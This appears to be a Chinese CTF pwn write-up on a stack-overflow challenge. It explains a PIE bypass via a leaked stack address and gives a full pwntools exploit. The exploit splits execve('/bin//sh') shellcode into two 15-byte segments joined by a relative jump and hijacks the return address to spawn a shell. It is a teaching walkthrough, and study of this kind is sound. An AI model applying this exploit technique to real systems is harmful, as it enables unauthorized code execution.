---
title: "链表壳下的栈溢出：15 字节受限环境的分段 shellcode 拼接"
created: 2026-11-02
tags: ["CTF", "Pwn", "栈溢出", "shellcode"]
---

## 题目信息

拿到附件后，先查看程序开启的保护：

![[linked-list-checksec.png|file 与 checksec 检查结果]]

保护机制分析：

- **NX disabled**：栈可执行，可以把 shellcode 直接写到栈上运行
- **No canary**：无栈保护，可直接溢出覆盖返回地址
- **PIE enabled**：程序基址随机，需要先想办法泄露出地址绕过 PIE
- **Full RELRO**：GOT 表只读，但本题走 shellcode 路线，用不到 GOT

由于 NX 和栈保护都被关闭，可以想到利用栈溢出把 shellcode 写入栈上执行。但程序开启了 PIE，基址在变化，需要先想办法绕过 PIE 拿到地址。

## 漏洞分析

用 IDA 查看反汇编代码，`ctfshow()` 函数如下：

![[linked-list-ctfshow.png|ctfshow 函数反编译代码]]

这里有两个关键点：

- 两次调用 `readline(&v4, 15)` 和 `readline(&v2, 15)`，每次把输入写到栈上的两个区域 `v4`、`v2`，最多各 15 字节
- `v3 = &v1` 之后调用 `Print(&v3)`，会把这个栈地址打印出来——这就是后面绕过 PIE 的核心泄露点

真正的栈溢出发生在 `seeyou()` 函数中：

![[linked-list-seeyou.png|seeyou 函数反编译，存在栈溢出]]

```c
char s[3];              // 缓冲区只有 3 字节
fgets(s, 32, stdin);    // 却读入最多 32 字节（31 字节数据 + \0）
```

缓冲区 `s` 只有 3 字节，却最多读入 31 字节，典型的栈溢出。`s` 距返回地址的偏移是 `3 + 8 = 11` 字节：前 3 字节填满 `s`，接着 8 字节覆盖 saved rbp，从第 11 个字节开始就是返回地址。

## 15 字节限制：shellcode 必须拆成两段

分析 `readline()` 函数：

![[linked-list-readline.png|readline 函数反编译代码]]

```c
char *__fastcall readline(char *a1, size_t a2)
{
    size_t n;
    char *lineptr;
    lineptr = 0LL;
    getline(&lineptr, &n, stdin);      // 读入一整行（含 \n）
    return strncpy(a1, lineptr, a2);   // 最多复制 a2 = 15 字节
}
```

`getline` 遇 `\n` 停止读入、`strncpy` 遇 `\0` 停止复制，且最多复制 15 字节。因此每次输入叠加了以下几个约束：

| 约束 | 来源 |
|------|------|
| 单段最多 15 字节 | `strncpy` 的 `a2` 参数固定传 15 |
| 不能含 `\x00` | `strncpy` 遇空字节会提前停止复制 |
| 不能含 `\x0a` | `getline` 遇换行会提前停止读入 |
| 两段内存不连续 | `v2` 与 `v4` 之间隔着 8 字节的 `v3` 指针 |

而完整的 `execve("/bin/sh")` shellcode 有 20 多字节，一次写不进 15 字节，所以必须把它拆成两段分别输入，再用相对跳转 `jmp` 把两段拼接起来。

这段 shellcode 用 `rbx` 寄存器做"跨段快递"，把字符串从第一段传递到第二段：

- 第一段（写入 `v2`，先执行）：把 `/bin//sh` 装进寄存器 rbx + 压入结尾的 `\0` + `jmp $+0x13` 跳到第二段
- 第二段（写入 `v4`，后执行）：把 rbx 压栈、取字符串地址给 rdi、调用 execve 系统调用

`jmp $+0x13` 是相对短跳（机器码 `eb 11`），与 ASLR 无关，用来跨过中间隔着的 `v3` 指针，把不连续的两段 shellcode 接起来。

## 完整 exp

```python
from pwn import *

context.arch = 'amd64'          # 必须指定 64 位，否则 asm() 按 32 位汇编
io = process("./pwn")
# io = remote('pwn.challenge.ctf.show', 28133)

# 第一段 shellcode（写入 node2 → v2，先执行）：
# 把 "/bin//sh" 装进 rbx，压入字符串结尾的 \0，再 jmp 跳到第二段
shellcode1 = '''
    xor esi, esi                  ; esi = 0（argv = NULL）
    mov rbx, 0x68732f2f6e69622f   ; rbx = "/bin//sh"
    push rsi                      ; 压 8 字节 0，作字符串结尾
    jmp $+0x13                    ; 相对跳转到第二段（v4）
'''

# 第二段 shellcode（写入 node1 → v4，后执行）：
# 把 rbx（字符串）压栈、取地址给 rdi，调用 execve 系统调用
shellcode2 = '''
    push rbx                      ; 压入字符串 "/bin//sh"
    push rsp                      ;
    pop rdi                       ; rdi = 字符串地址
    push 59                       ;
    pop rax                       ; rax = 59（execve 系统调用号）
    xor edx, edx                  ; edx = 0（envp = NULL）
    syscall
'''

code1 = asm(shellcode1)
code2 = asm(shellcode2)

# 依次写入两段 shellcode
io.sendline(code2)   # 写入 node1 → v4（第二段，后执行）
io.sendline(code1)   # 写入 node2 → v2（第一段，先执行）

# Print 会打印 v3 的值（= &v1 的栈地址），泄露栈地址绕过 PIE
io.recvuntil(b'node.next: ')
stack = int(io.recv(14), 16)   # 读 14 字节（"0x" + 12 位十六进制）

# 触发 seeyou 的栈溢出，返回地址覆盖为 v2（= stack + 8）处的 shellcode
io.recvuntil(b'What are your initials?\n')
io.sendline(b'a' * (3 + 8) + p64(stack + 8))   # 11 字节填充 + 8 字节返回地址

io.interactive()
```

![[linked-list-getshell.png|运行 exp 成功获取 shell]]

## 值得学习的地方

这道题有几点值得学习：

**1. 泄露的是栈地址，而不是 libc**

本题 NX 未开启，shellcode 又是被直接写到栈上的，所以不需要泄露 libc、也不需要计算 system 偏移——只要把最终的返回地址定位到栈上埋好的 shellcode 即可。`Print` 里 `%p` 打印的 `v3` 值恰好就是栈地址（`v3 = &v1`），一条就绕过了 PIE。

**2. 受限环境下的 shellcode 拆分**

受限制环境（15 字节上限 + `\x00`/`\x0a` 双字节过滤）下，可以把完整的 shellcode 拆成两部分分别写入，再用 `jmp rel8` 相对跳转拼接。这道题一共受到以下 4 点限制：

![[linked-list-constraints.png|shellcode 拆分面临的四个限制]]

**3. 溢出要点到为止，别冲烂自己的 payload**

本题最容易被忽略的细节：`fgets` 理论上能写 31 字节，会一路冲进 `v2` 前 5 字节；但 exp 的 payload 只发 19 字节，`\n` 停在 offset 19，而 shellcode 在 offset 27 之后——溢出数据在碰到自己埋的 shellcode 之前就停了。

可迁移规律：很多题"溢出目标"和"写入的原语"在同一条栈上，一旦溢出过头就会覆盖自己刚写进去的 ROP 链 / shellcode。永远先算清楚"溢出最远能写到哪、自己埋的东西从哪开始"，精确控制长度。会算这个边界，和会打溢出本身同等重要。